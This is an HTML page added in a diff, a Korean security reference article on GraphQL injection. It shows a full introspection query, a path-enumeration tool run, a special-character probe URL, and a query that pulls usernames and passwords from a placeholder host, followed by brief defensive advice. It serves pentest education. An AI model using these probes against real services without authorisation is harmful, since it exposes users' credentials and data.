@@ -1,0 +1,204 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>GraphQL Injection — PIXN</title>
+  <meta name="description" content="GraphQL Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="GraphQL Injection — PIXN"><meta property="og:description" content="GraphQL Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>GraphQL Injection</h1>
+      <time datetime="2022-08-09">AUGUST 9, 2022</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>GraphQL Injection은 GraphQL을 사용하는 환경에서의 Injection 공격을 의미합니다. GraphQL 특성 상 사용자가 요청한 Query는 하나의 서버 또는 복수의 서버에서 처리되어 결과를 리턴하기 떄문에 단순히 GraphQL 만의 문제가 아닌 SQL Injection이나 XXE 등 다른 취약점으로 연결될 가능성이 높습니다.</p>
+<p>그래서 좁은 의미로는 GraphQL 자체 즉, Scheme과 Query 간에서 발생하는 공격을 의미하고, 넓게는 백엔드에서의 처리 문제로 인한 부분(SQLi, XXE 등)도 포함되기도 합니다.</p>
+<blockquote>
+<p>GraphQL에 대한 전반적인 보안 관련 내용은 &quot;<a href="https://www.hahwul.com/cullinan/graphql">Cullinan &gt; GraphQL Security</a>&quot; 참고해주세요.</p>
+</blockquote>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>서비스에서 GraphQL을 사용하는 부분은 모두 테스팅 포인트가 됩니다. 보편적으로 /graphql 등의 경로를 많이 사용하며, 해당 경로가 아니더라도 query를 포함한 경우 GrphQL 서비스로 확인합니다.</p>
+<p>GraphQL의 Endpoint를 찾았다면 Schema, Query 영역에 특수문자 등을 통해 의도되지 않은 동작이나 에러가 발생하도록 시도합니다.</p>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="enum-via-introspection-query">Enum via Introspection Query</h4>
+<p>Introspection Query는 GraphQL에서 스키마와 쿼리에 대한 정보를 질의할 수 있도록 제공하는 쿼리입니다. __schema를 이용한 쿼리 기법이고 GraphQL 전체 구조를 질의할 수 있도록 쿼리를 구성할 수 있습니다.</p>
+<pre><code class="language-graphql hljs"><span class="hljs-keyword">query</span> <span class="hljs-title class_">IntrospectionQuery</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-property">__schema</span> <span class="hljs-punctuation">{</span>
+
+        <span class="hljs-keyword">query</span><span class="hljs-title class_">Type</span> <span class="hljs-punctuation">{</span> <span class="hljs-property">name</span> <span class="hljs-punctuation">}</span>
+        <span class="hljs-keyword">mutation</span><span class="hljs-title class_">Type</span> <span class="hljs-punctuation">{</span> <span class="hljs-property">name</span> <span class="hljs-punctuation">}</span>
+        <span class="hljs-keyword">subscription</span><span class="hljs-title class_">Type</span> <span class="hljs-punctuation">{</span> <span class="hljs-property">name</span> <span class="hljs-punctuation">}</span>
+        <span class="hljs-keyword">type</span><span class="hljs-title class_">s</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-keyword">...</span><span class="hljs-property">FullType</span>
+        <span class="hljs-punctuation">}</span>
+        <span class="hljs-keyword">directive</span><span class="hljs-property">s</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-property">name</span>
+          <span class="hljs-property">description</span>
+
+          <span class="hljs-property">locations</span>
+          <span class="hljs-property">args</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-keyword">...</span><span class="hljs-property">InputValue</span>
+          <span class="hljs-punctuation">}</span>
+        <span class="hljs-punctuation">}</span>
+      <span class="hljs-punctuation">}</span>
+    <span class="hljs-punctuation">}</span>
+
+    <span class="hljs-keyword">fragment</span> <span class="hljs-title class_">FullType</span> <span class="hljs-keyword">on</span> <span class="hljs-property">__Type</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-property">kind</span>
+      <span class="hljs-property">name</span>
+      <span class="hljs-property">description</span>
+
+      <span class="hljs-property">fields</span><span class="hljs-punctuation">(</span><span class="hljs-property">includeDeprecated</span><span class="hljs-punctuation">:</span> <span class="hljs-title class_">true</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-property">name</span>
+        <span class="hljs-property">description</span>
+        <span class="hljs-property">args</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-keyword">...</span><span class="hljs-property">InputValue</span>
+        <span class="hljs-punctuation">}</span>
+        <span class="hljs-keyword">type</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-keyword">...</span><span class="hljs-title class_">TypeRef</span>
+        <span class="hljs-punctuation">}</span>
+        <span class="hljs-property">isDeprecated</span>
+        <span class="hljs-property">deprecationReason</span>
+      <span class="hljs-punctuation">}</span>
+      <span class="hljs-keyword">input</span><span class="hljs-title class_">Fields</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-keyword">...</span><span class="hljs-property">InputValue</span>
+      <span class="hljs-punctuation">}</span>
+      <span class="hljs-keyword">interface</span><span class="hljs-title class_">s</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-keyword">...</span><span class="hljs-property">TypeRef</span>
+      <span class="hljs-punctuation">}</span>
+      <span class="hljs-keyword">enum</span><span class="hljs-title class_">Values</span><span class="hljs-punctuation">(</span><span class="hljs-property">includeDeprecated</span><span class="hljs-punctuation">:</span> <span class="hljs-title class_">true</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-property">name</span>
+        <span class="hljs-property">description</span>
+        <span class="hljs-property">isDeprecated</span>
+        <span class="hljs-property">deprecationReason</span>
+      <span class="hljs-punctuation">}</span>
+      <span class="hljs-property">possibleTypes</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-keyword">...</span><span class="hljs-property">TypeRef</span>
+      <span class="hljs-punctuation">}</span>
+    <span class="hljs-punctuation">}</span>
+
+    <span class="hljs-keyword">fragment</span> <span class="hljs-title class_">InputValue</span> <span class="hljs-keyword">on</span> <span class="hljs-property">__InputValue</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-property">name</span>
+      <span class="hljs-property">description</span>
+      <span class="hljs-keyword">type</span> <span class="hljs-punctuation">{</span> <span class="hljs-keyword">...</span><span class="hljs-title class_">TypeRef</span> <span class="hljs-punctuation">}</span>
+      <span class="hljs-property">defaultValue</span>
+
+
+    <span class="hljs-punctuation">}</span>
+
+    <span class="hljs-keyword">fragment</span> <span class="hljs-title class_">TypeRef</span> <span class="hljs-keyword">on</span> <span class="hljs-property">__Type</span> <span class="hljs-punctuation">{</span>
+      <span class="hljs-property">kind</span>
+      <span class="hljs-property">name</span>
+      <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-property">kind</span>
+        <span class="hljs-property">name</span>
+        <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-property">kind</span>
+          <span class="hljs-property">name</span>
+          <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-property">kind</span>
+            <span class="hljs-property">name</span>
+            <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+              <span class="hljs-property">kind</span>
+              <span class="hljs-property">name</span>
+              <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+                <span class="hljs-property">kind</span>
+                <span class="hljs-property">name</span>
+                <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+                  <span class="hljs-property">kind</span>
+                  <span class="hljs-property">name</span>
+                  <span class="hljs-property">ofType</span> <span class="hljs-punctuation">{</span>
+                    <span class="hljs-property">kind</span>
+                    <span class="hljs-property">name</span>
+                  <span class="hljs-punctuation">}</span>
+                <span class="hljs-punctuation">}</span>
+              <span class="hljs-punctuation">}</span>
+            <span class="hljs-punctuation">}</span>
+          <span class="hljs-punctuation">}</span>
+        <span class="hljs-punctuation">}</span>
+      <span class="hljs-punctuation">}</span>
+    <span class="hljs-punctuation">}</span>
+</code></pre>
+<p>보통 위의 쿼리를 이용하여 결과를 뽑아낸 후 아래 <a href="https://ivangoncharov.github.io/graphql-voyager/">GraphQL Voyager</a>로 구성도를 그려서 확인합니다.</p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/183671628-d7ec504a-9ff0-4470-a8ae-8a3536e74e71.png" alt="" /></p>
+<p><code>CHANGE SCHEMA</code> &gt; <code>INTROSPECTION</code> &gt; <code>결과 붙여넣기</code> &gt; <code>DISPLAY</code></p>
+<h4 id="enum-via-graphql-path-enum">Enum via graphql-path-enum</h4>
+<pre><code class="language-bash hljs"><span class="hljs-comment"># Clone graphql-path-enum</span>
+git clone https://gitlab.com/dee-see/graphql-path-enum
+<span class="hljs-built_in">cd</span> graphql-path-enum
+
+<span class="hljs-comment"># Run</span>
+graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
+</code></pre>
+<p>Result</p>
+<pre><code>Found 27 ways to reach the &quot;Skill&quot; node from the &quot;Query&quot; node:
+- Query (assignable_teams) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill
+- Query (checklist_check) -&gt; ChecklistCheck (checklist) -&gt; Checklist (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill
+- Query (checklist_check_response) -&gt; ChecklistCheckResponse (checklist_check) -&gt; ChecklistCheck (checklist) -&gt; Checklist (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill
+....
+</code></pre>
+<h4 id="check-injection">Check Injection</h4>
+<p>GraphQL에 붙어있는 API들이 어떤 데이터를 어떻게 가공하는지 알 수 없기 때문에 GraphQL의 구조를 최대한 파악한 후 기능별로 쿼리를 진행해야합니다. 단순하게는 Key/Value 내 특수문자나 서비스에서 사용하지 않는 값들을 위주로 전송하여 Response를 확인할 수 있습니다.</p>
+<pre><code>GET https://blahblah/graphql?query={wor'&quot;&gt;k}
+</code></pre>
+<h4 id="query-to-sensitive-info">Query to sensitive info</h4>
+<pre><code>GET https://blahblah/graphql?query={user{username,password}}
+</code></pre>
+<p>Response</p>
+<pre><code class="language-json hljs"><span class="hljs-number">200</span> OK
+
+<span class="hljs-punctuation">{</span>
+  <span class="hljs-name">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-name">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+      <span class="hljs-punctuation">{</span>
+        <span class="hljs-name">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-name">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-punctuation">{</span>
+        <span class="hljs-name">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bhbghyuyg&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-name">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user2&quot;</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-punctuation">{</span>
+        <span class="hljs-name">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hiuoij&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-name">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user1&quot;</span>
+      <span class="hljs-punctuation">}</span>
+    <span class="hljs-punctuation">]</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>GraphQL Injection 또한 다른 Injection 공격과 같이 사용자 입력값에 대한 검증이 필요합니다. 또한 GraphQL을 통해 생각보다 많은 정보에 접근할 가능성이 있기 떄문에 설계 단계에서 데이터, 권한 등에 대한 고민과 보호 로직이 필요합니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/GraphQLmap">GraphQLmap</a></li>
+<li><a href="https://apis.guru/graphql-voyager/">GraphQL-voyager</a></li>
+<li><a href="https://github.com/doyensec/graph-ql/">GraphQL Security Toolkit</a></li>
+<li><a href="https://gitlab.com/dee-see/graphql-path-enum">Graphql-path-enum</a></li>
+<li><a href="https://github.com/andev-software/graphql-ide">GraphQL IDE</a></li>
+<li><a href="https://github.com/mchoji/clairvoyancex">ClairvoyanceX</a></li>
+<li><a href="https://github.com/doyensec/inql">InQL</a></li>
+<li><a href="https://insomnia.rest/">Insomnia</a></li>
+<li><a href="https://graphql-dashboard.herokuapp.com/">AutoGraphql + introspection</a></li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li><a href="https://www.hahwul.com/2019/06/23/graphqlmap/">https://www.hahwul.com/2019/06/23/graphqlmap/</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection</a></li>
+<li><a href="https://graphql.org/learn/">https://graphql.org/learn/</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/graphql-injection/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
